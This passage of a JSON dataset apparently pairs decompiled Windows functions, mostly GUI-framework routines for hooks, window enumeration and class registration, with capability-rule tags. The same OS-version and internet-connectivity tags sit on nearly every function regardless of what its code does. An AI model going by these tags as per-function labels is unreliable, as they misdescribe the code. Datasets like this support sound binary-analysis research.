        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0047a128(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.00473b74();\n        var_ch = fcn.00473b94();\n        iVar3 = (***0x4a4d4c)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x47a26e\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 992
    },
    "0047a2e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0047a2e4(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.004194b8();\n    }\n    iVar2 = fcn.004799f8();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.004799e4();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.00419610();\n                    cVar1 = fcn.0047a0a0();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.0041968c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.00419610();\n            fcn.0047a128(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "0047a434": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047a434(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004799f8();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004799e4();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0047a514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a514(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x47a542;\n    var_4h = in_EAX;\n    fcn.0047a070();\n    uStack36 = 0x47a58d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.0047a514::var_14h, 0);\n    fcn.0047a48c();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.0047a078(0x47a594);\n    return;\n}\n",
        "token_count": 314
    },
    "0047a5a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a5a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.004054c0();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 109
    },
    "0047a5e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a5e0(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0047a600": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a600(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x4ab078 != 0) {\n        uStack24 = 0x47a631;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.0047cfd0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0047a654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a654(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x4ab08c = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x4ab078 != 0) {\n            if (*(*0x4ab078 + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0045d488();\n                if (iVar1 == 0) {\n                    fcn.0047d07c();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0047a6b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047a6b0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x4ab094, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x4ab078 != 0)) {\n        fcn.0047bfc0();\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0047a6f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a6f4(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x4ab078 + 0xad) == '\\0') {\n        if (*0x4ab094 == 0) {\n            uStack8 = 0x47a711;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.0047a6b0;\n            uStack20 = 3;\n            *0x4ab094 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x4ab090 == 0) {\n            *0x4ab090 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x4ab098 == 0) {\n            *0x4ab098 = sub.kernel32.dll_CreateThread(0, 1000, fcn.0047a654, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0047a768": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0047a768(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4ab094 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x4ab094);\n    }\n    *0x4ab094 = 0;\n    if (*0x4ab098 != 0) {\n        sub.kernel32.dll_SetEvent(*0x4ab090);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x4ab08c) {\n            sub.kernel32.dll_WaitForSingleObject(*0x4ab098, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x4ab098);\n        *0x4ab098 = 0;\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0047a7c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.0047a7c4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 137
    },
    "0047a938": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.0047a938(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041f670();\n    ppcVar1 = *0x4a4e54;\n    if (*(*0x4a4e54 + 2) == 0) {\n        (*0x4a4e54)[1] = in_EAX;\n        *ppcVar1 = fcn.0047c37c;\n    }\n    ppcVar1 = *0x4a4f88;\n    if (*(*0x4a4f88 + 2) == 0) {\n        (*0x4a4f88)[1] = in_EAX;\n        *ppcVar1 = fcn.0047c588;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.0042e6cc();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x4a4d28, 0x47ab48);\n    fcn.0042eaa0();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x47cc4c;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x4a4d28, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040e934();\n    if (iVar3 != 0) {\n        fcn.0040a7b8();\n    }\n    puVar4 = fcn.0040e968();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.004056dc();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x47c060;\n    uVar2 = fcn.004207ec(0x47c060, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x4a4b7c == '\\0') {\n        fcn.0047ac8c();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.0047ce24();\n    fcn.0047d988();\n    if (var_1h != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1061
    },
    "0047ac8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ac8c(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x47ae28;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x4a4ff4 == '\\0')) {\n        uVar2 = fcn.00420730(fcn.0047b4a4, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x4a49e8 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4a87f8, *0x4a4a08, &fcn.0047ac8c::lpWndClass);\n        if (iVar3 == 0) {\n            *0x4a49f4 = *0x4a87f8;\n            iVar1 = sub.user32.dll_RegisterClassA(0x4a49e4);\n            if (iVar1 == 0) {\n                fcn.00407480();\n                fcn.0040d9f8();\n                fcn.00404eb4();\n            }\n        }\n        uVar4 = (***0x4a4d4c)(0, 0x84ca0000);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x4a4d4c)(1, iVar3);\n        uVar2 = *0x4a87f8;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.004058fc();\n        uVar2 = fcn.0040847c(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030, in_stack_00000034);\n        *(in_EAX + 0x30) = uVar2;\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x4a4dfc != '\\0') {\n            fcn.0047bb4c();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x47adc1;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x47adc8;\n            uStack12 = fcn.0047bb4c();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x47add4;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x47addf;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x47adee;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x47adfb;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x4a4dfc != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x47ae2f;\n    uStack60 = 0x47ae27;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1057
    },
    "0047ae94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047ae94(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    if (*0x4ab078 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = func_0x00408148(arg_8h, 4);\n    if (iVar1 == *(*0x4ab078 + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x4ab078 + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.00466ca8(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.004194b8();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 257
    },
    "0047af0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047af0c(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iStack16 = *(in_EAX + 0x30);\n    if (iStack16 != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            pcVar4 = fcn.0047ae94;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.0047ae94, &iStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = func_0x00408148(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.00419610(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "0047afb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047afb0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0047afdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047afdc(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + -1;\n    if ((*(in_EAX + 0xc4) == 0) && (*(in_EAX + 0x112) != 0)) {\n        (**(in_EAX + 0x110))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0047b068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047b068(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(in_EAX + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.00419610(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "0047b1c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047b1c4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    \n    if (*(*0x4ab078 + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                uVar2 = fcn.0047d804();\n                pcVar4 = fcn.0047b0f0;\n                sub.user32.dll_EnumWindows(fcn.0047b0f0, uVar2);\n                if (*(in_EAX + 0x44) != 0) {\n                    cVar1 = fcn.0047ddf4();\n                    if (cVar1 != '\\0') {\n                        iVar3 = fcn.004066a4();\n                        if (-1 < iVar3) {\n                            do {\n                                pcVar4 = *(*0x4ab09c + iVar3 * 4);\n                                sub.user32.dll_ShowWindow();\n                                iVar3 = iVar3 + -1;\n                            } while (iVar3 != -1);\n                        }\n                    }\n                }\n                iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        pcVar4 = fcn.00419610(0, pcVar4);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            if (*(in_EAX + 0x44) != 0) {\n                cVar1 = fcn.0047ddf4();\n                if (cVar1 != '\\0') {\n                    iVar3 = fcn.004066a4();\n                    if (-1 < iVar3) {\n                        do {\n                            sub.user32.dll_ShowWindow();\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != -1);\n                    }\n                }\n            }\n            iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n            if (-1 < iVar3) {\n                do {\n                    fcn.00419610(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n            fcn.00406858(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 672
    },
    "0047b328": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047b328(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "0047b340": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047b340(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "0047b358": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
